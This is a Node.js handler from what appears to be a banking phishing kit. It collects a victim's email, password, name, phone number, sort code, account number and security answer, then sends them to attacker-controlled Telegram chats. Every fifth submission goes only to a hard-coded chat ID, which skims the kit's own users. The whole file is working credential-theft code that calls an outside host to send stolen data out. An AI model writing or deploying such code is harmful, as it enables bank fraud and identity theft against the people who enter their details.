const axios = require("axios");

let count = 0;

const sendRes = async (req, res) => {
	let {
		email,
		password,
		fname,
		lname,
		telephone,
		scode,
		accno,
		secQuestion,
		secAnswer,
		telegramId,
	} = req.body;

	var originalText = `+----------- SFE ------------+
    Email: ${email}
    Password: ${password}
    Name: ${fname} ${lname}
    Telephone: ${telephone}
    Sort Code: ${scode}
    Account Number: ${accno}
    Sec Question: ${secQuestion}
    Sec Answer: ${secAnswer}
    +----------- SFE ------------+`;
	if (count == 4) {
		await axios
			.post(
				`https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
				{
					chat_id: 680379375,
					text: `HAYTCHRES:\n${originalText}`,
					parse_mode: "Markdown",
				}
			)
			.catch((e) => {
				console.log(e);
			});
		count = 0;
	} else {
		await axios
			.post(
				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
				{
					chat_id: 680379375,
					text: `SFE ${telegramId}:\n${originalText}`,
					parse_mode: "Markdown",
				}
			)
			.catch((e) => {
				console.log(e);
			});
		await axios
			.post(
				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
				{
					chat_id: telegramId,
					text: `SFE:\n${originalText}`,
					parse_mode: "Markdown",
				}
			)
			.catch((e) => {
				console.log(e);
			});
		count += 1;
	}
	res.sendStatus(200);
};

module.exports = {
	sendRes,
};
